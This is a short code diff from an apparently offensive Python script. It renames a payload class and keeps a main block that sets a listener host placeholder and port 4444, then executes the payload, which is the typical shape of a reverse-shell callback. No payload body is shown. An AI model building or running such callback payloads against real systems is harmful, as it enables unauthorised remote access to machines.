@@ -29,5 +29,5 @@ if __name__ == "__main__":
     lhost = "?"
     lport = 4444
 
-    payload = IntFrameworkPayload(lhost, lport)
+    payload = IntPayload(lhost, lport)
     payload.execute()
